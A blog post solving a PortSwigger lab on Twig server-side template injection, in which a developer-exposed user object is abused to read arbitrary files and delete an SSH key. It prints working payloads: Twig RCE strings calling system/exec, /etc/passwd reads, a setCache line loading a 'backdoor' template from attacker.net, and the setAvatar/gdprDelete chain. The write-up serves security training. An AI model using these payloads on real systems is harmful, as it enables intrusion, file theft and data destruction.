<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="generator" content="Jekyll">
  

  <title>Expert Lab: Server-side Template Injection with a Custom Exploit - Diaries of a Modern Ninja</title>

  <link rel="stylesheet" href="/css/main.css">
  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">
  <link rel="alternate" type="application/rss+xml" title="Diaries of a Modern Ninja" href="https://nima.ninja/feed.xml"> <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.1" />
<meta property="og:title" content="Expert Lab: Server-side Template Injection with a Custom Exploit" />
<meta name="author" content="Nima" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="1 Lab Link Lab: Server-side template injection with a custom exploit Icon made by Freepik from www.flaticon.com.¬†&#8617;" />
<meta property="og:description" content="1 Lab Link Lab: Server-side template injection with a custom exploit Icon made by Freepik from www.flaticon.com.¬†&#8617;" />
<link rel="canonical" href="https://nima.ninja/blog/2023/expert-lab-server-side-template-injection-with-a-custom-exploit" />
<meta property="og:url" content="https://nima.ninja/blog/2023/expert-lab-server-side-template-injection-with-a-custom-exploit" />
<meta property="og:site_name" content="Diaries of a Modern Ninja" />
<meta property="og:image" content="https://nima.ninja/blog/assets/ssti-custom-exploit-twig.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-04-24T00:00:00-05:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://nima.ninja/blog/assets/ssti-custom-exploit-twig.png" />
<meta property="twitter:title" content="Expert Lab: Server-side Template Injection with a Custom Exploit" />
<meta name="twitter:site" content="@cSh4rk" />
<meta name="twitter:creator" content="@cSh4rk" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Nima"},"dateModified":"2023-04-24T00:00:00-05:00","datePublished":"2023-04-24T00:00:00-05:00","description":"1 Lab Link Lab: Server-side template injection with a custom exploit Icon made by Freepik from www.flaticon.com.¬†&#8617;","headline":"Expert Lab: Server-side Template Injection with a Custom Exploit","image":"https://nima.ninja/blog/assets/ssti-custom-exploit-twig.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://nima.ninja/blog/2023/expert-lab-server-side-template-injection-with-a-custom-exploit"},"url":"https://nima.ninja/blog/2023/expert-lab-server-side-template-injection-with-a-custom-exploit"}</script>
<!-- End Jekyll SEO tag -->

</head>


  <body>
    <div id="wrapper">
      <header>
  <div>
    <a href="/">
    
    <h1><!--email_off-->nima@home:~$<!--/email_off--></h1>
    </a>
    <div class="header-links">
      <a href="/about"><h2 class="header-link">About</h2></a>
<a href="/"><h2 class="header-link">All</h2></a>
<a href="/blog/"><h2 class="header-link">Blog</h2></a>
<a href="/books/"><h2 class="header-link">Books</h2></a>
<a href="/links/"><h2 class="header-link">Links</h2></a>
<a href="/tags/"><h2 class="header-link">Tags</h2></a>
<a href="/contact"><h2 class="header-link">Contact</h2></a>
<a href="/kevin-mitnick" class="no-decoration"><h2 class="header-link" title="RIP Kevin Mitnick">üñ§</h2></a>

<!--<a href="/feed.xml"><h2 class="header-link">RSS</h2></a>-->

    </div>
  </div>
</header>

      <div class="container">
        <section id="main_content">
          <article>
  <h2>Expert Lab: Server-side Template Injection with a Custom Exploit</h2>
  <div class="postitem">
    
      <a href="/blog/" class="no-decoration"><code class="language-plaintext highlighter-rouge">blog</code></a>
    
    
      <code class="posttag"><a href="/tags/#web-application-security" class="no-decoration">Web Application Security</a></code>
    
      <code class="posttag"><a href="/tags/#web-security-academy" class="no-decoration">Web Security Academy</a></code>
    
      <code class="posttag"><a href="/tags/#expert-labs" class="no-decoration">Expert Labs</a></code>
    
      <code class="posttag"><a href="/tags/#server-side-template-injection" class="no-decoration">Server-Side Template Injection</a></code>
    
      <code class="posttag"><a href="/tags/#ssti" class="no-decoration">SSTI</a></code>
    
      <code class="posttag"><a href="/tags/#php" class="no-decoration">PHP</a></code>
    
      <code class="posttag"><a href="/tags/#twig" class="no-decoration">Twig</a></code>
    
  </div>
  <time datetime="2023-04-24T00:00:00-05:00" class="by-line">24 Apr 2023</time>
  <p><br />
<img src="/blog/assets/ssti-custom-exploit-twig.png" alt="" />
<br />
<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup>
<br /></p>
<h3 id="lab-link">Lab Link</h3>
<p><a href="https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit">Lab: Server-side template injection with a custom exploit</a></p>

<p><br /></p>
<h3 id="lab-description">Lab Description</h3>
<hr />
<p><br />
This lab is vulnerable to server-side template injection<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup>. To solve the lab, create a custom exploit to delete the file <code class="language-plaintext highlighter-rouge">/.ssh/id_rsa</code> from Carlos‚Äôs home directory.</p>

<p>You can log in to your own account using the following credentials: wiener:peter
<br />
<br /></p>
<h4 id="warning"><strong>Warning</strong></h4>

<p>As with many high-severity vulnerabilities, experimenting with server-side template injection can be dangerous. If you‚Äôre not careful when invoking methods, it is possible to damage your instance of the lab, which could make it unsolvable. If this happens, you will need to wait 20 minutes until your lab session resets.</p>

<p><br /></p>
<h3 id="solutions">Solutions</h3>
<hr />
<p><br /></p>
<h3 id="solution-1-my-solution">Solution 1: My Solution</h3>
<p>This lab was pretty cool, I really enjoyed it, It took me a few days to solve this lab because at first I was going to the wrong direction reading all the stuff in Twig documentation<sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote" rel="footnote">3</a></sup> which was unnecessary for this lab. Because in order to exploit most templating engines, you need to read the documentation and find important tips about security issues, warnings, plugins and extensions, FAQ, how to upload custom templates, developer section, how to create custom gadget chains, chaining suitable objects until we can get a useful method which leads to RCE or file read which could cause sensitive information disclosure‚Ä¶ all of which can become pretty time-consuming.</p>

<p>I tried to create custom Twig templates, Twig extensions and Twig filters and upload them to the server with the avatar image upload functionality and then run them where I had found template injection, I tried to create custom PHP files, and run them, none of these methods worked because Twig is already a quite hardened templating engine, so I realized I need another approach.</p>

<p>I also pressed ChatGPT very hard asking all kinds of questions about Twig documentation and the syntax on how to create new Twig filters, extensions‚Ä¶</p>

<p>But the answer was simpler than I thought first, it just needed complete attention to the part of Web Security Academy before the lab<sup id="fnref:4" role="doc-noteref"><a href="#fn:4" class="footnote" rel="footnote">4</a></sup>, actually the description there had the answer in it:</p>

<blockquote>
  <p>Some template engines run in a secure, locked-down environment by default in order to mitigate the associated risks as much as possible. Although this makes it difficult to exploit such templates for remote code execution, <code class="language-plaintext highlighter-rouge">developer-created objects that are exposed to the template can offer a further, less battle-hardened attack surface</code>.</p>
</blockquote>

<blockquote>
  <p>However, while substantial documentation is usually provided for template built-ins, site-specific objects are almost certainly not documented at all. Therefore, working out how to exploit them will require you to investigate the website‚Äôs behavior manually to identify the attack surface and construct your own custom exploit accordingly.</p>
</blockquote>

<p><br />
So we should search for developer-created objects, this is tip #1.</p>

<p>Ok, we run the lab, Open Burp Suite and proxy the traffic, log in as the <code class="language-plaintext highlighter-rouge">wiener</code> user, in the <code class="language-plaintext highlighter-rouge">account</code> page, there are two other tips:</p>

<ol start="2">
  <li>We can choose the ‚ÄúPreferred name‚Äù:</li>
</ol>

<p><img src="/blog/assets/ssti-custom-exploit-twig1.png" alt="" /></p>

<p>for example we can choose ‚ÄúFirst Name‚Äù, check Burp and see the request <code class="language-plaintext highlighter-rouge">POST /my-account/change-blog-post-author-display</code> is sent and some part of body is: <code class="language-plaintext highlighter-rouge">blog-post-author-display=user.first_name</code>.</p>

<p>Also post a comment in one of the posts on the website and see that our account‚Äôs first name, Peter, is shown as the comment post:</p>

<p><img src="/blog/assets/ssti-custom-exploit-twig2.png" alt="" /></p>

<p>So our ‚ÄúPreferred name‚Äù is reflected in comment post section, we can test if this is vulnerable to template injection:</p>

<p>Send that previous <code class="language-plaintext highlighter-rouge">POST /my-account/change-blog-post-author-display</code> request to Burp repeater and change the <code class="language-plaintext highlighter-rouge">blog-post-author-display</code> in the message body like the following to test for temlpate injection:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>blog-post-author-display=user.first_name${{&lt;%[%'"}}
</code></pre></div></div>

<p>And send the request, then refresh the post page that we had commented on, now this error is shown:</p>

<p><img src="/blog/assets/ssti-custom-exploit-twig3.png" alt="" /></p>

<p>Which is quite useful. It shows we are dealing with Twig Template. We can now use some Twig syntax to see if there is template Injection:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>blog-post-author-display=user.first_name}}{{7*7
</code></pre></div></div>

<p>Then we can see, the result is reflected in our first name in the comments:</p>

<p><img src="/blog/assets/ssti-custom-exploit-twig4.png" alt="" /></p>

<p>So we have template injection, but can we exploit it?</p>

<p>We search for some common Twig payloads and test them in the above section:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span><span class="nf">dump</span><span class="p">(</span><span class="n">app</span><span class="p">)}}</span>
<span class="p">{{</span><span class="n">app</span><span class="mf">.</span><span class="n">request</span><span class="mf">.</span><span class="n">server</span><span class="mf">.</span><span class="n">all</span><span class="o">|</span><span class="nb">join</span><span class="p">(</span><span class="s1">','</span><span class="p">)}}</span>

<span class="c1">#File read</span>
<span class="s2">"</span><span class="si">{</span><span class="nv">{'/etc/passwd'|file_excerpt(1,30)}</span><span class="si">}</span><span class="s2">"</span><span class="o">@</span>
<span class="p">{{</span><span class="k">include</span><span class="p">(</span><span class="s2">"wp-config.php"</span><span class="p">)}}</span>

<span class="c1">#Exec code</span>
<span class="p">{{</span><span class="n">_self</span><span class="mf">.</span><span class="n">env</span><span class="mf">.</span><span class="nf">setCache</span><span class="p">(</span><span class="s2">"ftp://attacker.net:2121"</span><span class="p">)}}{{</span><span class="n">_self</span><span class="mf">.</span><span class="n">env</span><span class="mf">.</span><span class="nf">loadTemplate</span><span class="p">(</span><span class="s2">"backdoor"</span><span class="p">)}}</span>
<span class="p">{{</span><span class="n">_self</span><span class="mf">.</span><span class="n">env</span><span class="mf">.</span><span class="nf">registerUndefinedFilterCallback</span><span class="p">(</span><span class="s2">"exec"</span><span class="p">)}}{{</span><span class="n">_self</span><span class="mf">.</span><span class="n">env</span><span class="mf">.</span><span class="nf">getFilter</span><span class="p">(</span><span class="s2">"id"</span><span class="p">)}}</span>
<span class="p">{{</span><span class="n">_self</span><span class="mf">.</span><span class="n">env</span><span class="mf">.</span><span class="nf">registerUndefinedFilterCallback</span><span class="p">(</span><span class="s2">"system"</span><span class="p">)}}{{</span><span class="n">_self</span><span class="mf">.</span><span class="n">env</span><span class="mf">.</span><span class="nf">getFilter</span><span class="p">(</span><span class="s2">"whoami"</span><span class="p">)}}</span>
<span class="p">{{</span><span class="n">_self</span><span class="mf">.</span><span class="n">env</span><span class="mf">.</span><span class="nf">registerUndefinedFilterCallback</span><span class="p">(</span><span class="s2">"system"</span><span class="p">)}}{{</span><span class="n">_self</span><span class="mf">.</span><span class="n">env</span><span class="mf">.</span><span class="nf">getFilter</span><span class="p">(</span><span class="s2">"id;uname -a;hostname"</span><span class="p">)}}</span>
<span class="p">{{[</span><span class="s1">'id'</span><span class="p">]</span><span class="o">|</span><span class="nf">filter</span><span class="p">(</span><span class="s1">'system'</span><span class="p">)}}</span>
<span class="p">{{[</span><span class="s1">'cat\x20/etc/passwd'</span><span class="p">]</span><span class="o">|</span><span class="nf">filter</span><span class="p">(</span><span class="s1">'system'</span><span class="p">)}}</span>
<span class="p">{{[</span><span class="s1">'cat$IFS/etc/passwd'</span><span class="p">]</span><span class="o">|</span><span class="nf">filter</span><span class="p">(</span><span class="s1">'system'</span><span class="p">)}}</span>
</code></pre></div></div>

<p>and see none of them actually work, so we still have a template injection that we may be able to use later, so let‚Äôs move on:</p>

<ol start="3">
  <li>We also see that we can upload our avatar image here:</li>
</ol>

<p><img src="/blog/assets/ssti-custom-exploit-twig5.png" alt="" /></p>

<p>First, we upload an actual image and check the request/response, no useful info is found, then let‚Äôs see what happens if we don‚Äôt select any file and click upload, as we can see we get an error:</p>

<p><img src="/blog/assets/ssti-custom-exploit-twig6.png" alt="" /></p>

<p>Let‚Äôs play with this again, this time we try to see if we can upload a PHP file, then click upload, once again we get another error message:</p>

<p><img src="/blog/assets/ssti-custom-exploit-twig7.png" alt="" /></p>

<p>This error is pretty useful, it shows two PHP files and also a <code class="language-plaintext highlighter-rouge">user.setAvatar()</code> method, so this <code class="language-plaintext highlighter-rouge">user</code> object that we also saw in tip #2 might be the developer-created object mentioned in our tip #1 and we might somehow be able to use its <code class="language-plaintext highlighter-rouge">setAvatar</code> method, let‚Äôs test it in <code class="language-plaintext highlighter-rouge">POST /my-account/change-blog-post-author-display</code> first:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>blog-post-author-display=user.setAvatar()
</code></pre></div></div>

<p>Now send the request and refresh the post page we had commented on to see the result, We get this error:</p>

<p><img src="/blog/assets/ssti-custom-exploit-twig8.png" alt="" /></p>

<p>Very good! It shows this method can be used, now let‚Äôs see if we can read those two PHP files found in the file upload errors, also notice in that image that <code class="language-plaintext highlighter-rouge">setAvatar()</code> method needs two arguments, first is the file path the second is MIME type, so first let‚Äôs try <code class="language-plaintext highlighter-rouge">/home/carlos/User.php</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>blog-post-author-display=user.setAvatar('/home/carlos/User.php','application/octet')
</code></pre></div></div>

<p>Send the request, refresh the post page, Now we get this error:</p>

<p><img src="/blog/assets/ssti-custom-exploit-twig9.png" alt="" /></p>

<p>Notice that it needs an image MIME type, so we change the payload like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>blog-post-author-display=user.setAvatar('/home/carlos/User.php','image/jpeg')
</code></pre></div></div>

<p>Send this request, refresh the post page, now something interesting happens:</p>

<p><img src="/blog/assets/ssti-custom-exploit-twig10.png" alt="" /></p>

<p>It seems our avatar image is successfully set to this PHP file, so we might be able to download and read this file. Now right click on this image and select ‚ÄúOpen image in new tab‚Äù now the User.php file is downloaded:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="kd">class</span> <span class="nc">User</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$first_name</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$nickname</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$user_dir</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$first_name</span><span class="p">,</span> <span class="nv">$nickname</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">username</span> <span class="o">=</span> <span class="nv">$username</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">first_name</span> <span class="o">=</span> <span class="nv">$first_name</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">nickname</span> <span class="o">=</span> <span class="nv">$nickname</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">user_dir</span> <span class="o">=</span> <span class="s2">"users/"</span> <span class="mf">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">username</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">avatarLink</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">user_dir</span> <span class="mf">.</span> <span class="s2">"/avatar"</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">user_dir</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">user_dir</span><span class="p">,</span> <span class="mo">0755</span><span class="p">,</span> <span class="kc">true</span><span class="p">))</span>
            <span class="p">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nc">Exception</span><span class="p">(</span><span class="s2">"Could not mkdir users/"</span> <span class="mf">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">username</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">setAvatar</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$mimetype</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$mimetype</span><span class="p">,</span> <span class="s2">"image/"</span><span class="p">)</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nc">Exception</span><span class="p">(</span><span class="s2">"Uploaded file mime type is not an image: "</span> <span class="mf">.</span> <span class="nv">$mimetype</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="nb">is_link</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">avatarLink</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">rm</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">avatarLink</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">symlink</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">avatarLink</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nc">Exception</span><span class="p">(</span><span class="s2">"Failed to write symlink "</span> <span class="mf">.</span> <span class="nv">$filename</span> <span class="mf">.</span> <span class="s2">" -&gt; "</span> <span class="mf">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">avatarLink</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">delete</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">user_dir</span> <span class="mf">.</span> <span class="s2">"/disabled"</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s2">""</span><span class="p">)</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nc">Exception</span><span class="p">(</span><span class="s2">"Could not write to "</span> <span class="mf">.</span> <span class="nv">$file</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">gdprDelete</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">rm</span><span class="p">(</span><span class="nb">readlink</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">avatarLink</span><span class="p">));</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">rm</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">avatarLink</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nb">delete</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="n">rm</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nc">Exception</span><span class="p">(</span><span class="s2">"Could not delete "</span> <span class="mf">.</span> <span class="nv">$filename</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>Do this same step to download avatar_upload.php, We are gathering as much info as we can now that may help us solve the lab:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>blog-post-author-display=user.setAvatar('/home/carlos/avatar_upload.php','image/jpeg')
</code></pre></div></div>

<p>We get this:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="k">require_once</span><span class="p">(</span><span class="s2">"./User.php"</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'avatar'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">throw</span> <span class="k">new</span> <span class="nc">Exception</span><span class="p">(</span><span class="s2">"Error in file upload: "</span> <span class="mf">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'avatar'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">]);</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'avatar'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">],</span> <span class="s2">"/"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span> <span class="o">||</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'avatar'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">],</span> <span class="s2">"."</span><span class="p">)</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">throw</span> <span class="k">new</span> <span class="nc">Exception</span><span class="p">(</span><span class="s2">"Uploaded file name is invalid: "</span> <span class="mf">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'avatar'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">]);</span>
<span class="p">}</span>

<span class="nv">$file</span> <span class="o">=</span> <span class="s2">"/tmp/"</span> <span class="mf">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'avatar'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'avatar'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">],</span> <span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">throw</span> <span class="k">new</span> <span class="nc">Exception</span><span class="p">(</span><span class="s2">"Could not move uploaded file '"</span> <span class="mf">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'avatar'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"' to '"</span> <span class="mf">.</span> <span class="nv">$file</span> <span class="mf">.</span> <span class="s2">"'"</span><span class="p">);</span>
<span class="p">}</span>

<span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">User</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'user'</span><span class="p">],</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
<span class="nv">$user</span><span class="o">-&gt;</span><span class="nf">setAvatar</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'avatar'</span><span class="p">][</span><span class="s1">'type'</span><span class="p">]);</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Location: ./'</span><span class="p">);</span>

<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>Now check the codes of these two files that are used in file upload functionality, we find an interesting public method: <code class="language-plaintext highlighter-rouge">gdprDelete()</code>, It is used to delete an avatar image and its symbolic link, so this might be our answer, first we set our avatar image as follows, with the file that should be deleted:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpeg')
</code></pre></div></div>

<p>Then we send this request and refresh the post page we had commented, then check if this file is set as our avatar image, right click and open it, it contains:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nothing to see here :)
</code></pre></div></div>

<p>So the file is set correctly as our avatar image, now we send the following payload using the function that we had found in User.php file, according to the code that we had downloaded, now this file and also the symbolic link that was made when <code class="language-plaintext highlighter-rouge">setAvatar()</code> function was called should be deleted, let‚Äôs see:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>blog-post-author-display=user.gdprDelete()
</code></pre></div></div>

<p>We send this request and refresh the post page that we had commented on to execute the payload and booom! The <code class="language-plaintext highlighter-rouge">/home/carlos/.ssh/id_rsa</code> file is deleted and the lab is solved!</p>

<p><br /></p>
<h4 id="warning-1"><strong>Warning</strong></h4>

<p>Be careful with <code class="language-plaintext highlighter-rouge">gdprDelete()</code> method, if it is called after:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>blog-post-author-display=user.setAvatar('/home/carlos/User.php','image/jpeg')
</code></pre></div></div>

<p>or this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>blog-post-author-display=user.setAvatar('/home/carlos/avatar_upload.php','image/jpeg')
</code></pre></div></div>

<p>These files are deleted from the server and since they have vital functionality for the server, we may inadvertently damage the server and may need to wait for 20 minutes for the lab server to reset.</p>

<p><br /></p>
<h3 id="solution-2--web-security-academys-solution">Solution 2:  Web Security Academy‚Äôs Solution</h3>

<ol>
  <li>
    <p>While proxying traffic through Burp, log in and post a comment on one of the blogs.</p>
  </li>
  <li>
    <p>Go to the ‚ÄúMy account‚Äù page. Notice that the functionality for setting a preferred name is vulnerable to server-side template injection, as we saw in a previous lab. You should also have noticed that you have access to the <code class="language-plaintext highlighter-rouge">user</code> object.</p>
  </li>
  <li>
    <p>Investigate the custom avatar functionality. Notice that when you upload an invalid image, the error message discloses a method called <code class="language-plaintext highlighter-rouge">user.setAvatar()</code>. Also take note of the file path <code class="language-plaintext highlighter-rouge">/home/carlos/User.php</code>. You will need this later.</p>
  </li>
  <li>
    <p>Upload a valid image as your avatar and load the page containing your test comment.</p>
  </li>
  <li>
    <p>In Burp Repeater, open the <code class="language-plaintext highlighter-rouge">POST</code> request for changing your preferred name and use the <code class="language-plaintext highlighter-rouge">blog-post-author-display</code> parameter to set an arbitrary file as your avatar:</p>
  </li>
</ol>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">user</span><span class="mf">.</span><span class="nf">setAvatar</span><span class="p">(</span><span class="s1">'/etc/passwd'</span><span class="p">)</span>
</code></pre></div></div>

<ol start="6">
  <li>Load the page containing your test comment to render the template. Notice that the error message indicates that you need to provide an image MIME type as the second argument. Provide this argument and view the comment again to refresh the template:</li>
</ol>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">user</span><span class="mf">.</span><span class="nf">setAvatar</span><span class="p">(</span><span class="s1">'/etc/passwd'</span><span class="p">,</span><span class="s1">'image/jpg'</span><span class="p">)</span>
</code></pre></div></div>

<ol start="7">
  <li>
    <p>To read the file, load the avatar using <code class="language-plaintext highlighter-rouge">GET /avatar?avatar=wiener</code>. This will return the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file, confirming that you have access to arbitrary files.</p>
  </li>
  <li>
    <p>Repeat this process to read the PHP file that you noted down earlier:</p>
  </li>
</ol>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">user</span><span class="mf">.</span><span class="nf">setAvatar</span><span class="p">(</span><span class="s1">'/home/carlos/User.php'</span><span class="p">,</span><span class="s1">'image/jpg'</span><span class="p">)</span>
</code></pre></div></div>

<ol start="9">
  <li>
    <p>In the PHP file, Notice that you have access to the <code class="language-plaintext highlighter-rouge">gdprDelete()</code> function, which deletes the user‚Äôs avatar. You can combine this knowledge to delete Carlos‚Äôs file.</p>
  </li>
  <li>
    <p>First set the target file as your avatar, then view the comment to execute the template:</p>
  </li>
</ol>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">user</span><span class="mf">.</span><span class="nf">setAvatar</span><span class="p">(</span><span class="s1">'/home/carlos/.ssh/id_rsa'</span><span class="p">,</span><span class="s1">'image/jpg'</span><span class="p">)</span>
</code></pre></div></div>

<ol start="11">
  <li>Invoke the <code class="language-plaintext highlighter-rouge">user.gdprDelete()</code> method and view your comment again to solve the lab.</li>
</ol>

<p><br /></p>
<h3 id="external-links"><em>External Links</em></h3>
<hr />
<ul>
  <li>
    <h4 id="lab-server-side-template-injection-with-a-custom-exploit"><a href="https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit">Lab: Server-side template injection with a custom exploit</a></h4>
  </li>
</ul>

<p><br /></p>
<h3 id="references"><em>References</em></h3>
<hr />
<div class="footnotes" role="doc-endnotes">
  <ol>
